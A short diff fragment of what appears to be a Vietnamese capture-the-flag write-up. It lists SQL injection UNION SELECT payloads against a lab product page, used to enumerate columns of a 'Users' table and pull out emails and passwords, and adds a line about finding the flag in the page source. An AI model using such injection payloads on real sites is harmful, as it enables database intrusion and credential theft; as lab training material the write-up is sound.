@@ -43,7 +43,7 @@ https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', passwo
 'union select '1', '2', column_name, '4' from information_schema.columns where table_name = 'Users' --
 - Xem dữ liệu Password của User
 'union select '1', '2', Email, '4' from Users --
-
+==> Chuyển qua view page source để xem flag
 ----------
 
 ###CTF5 - Missing Card Game
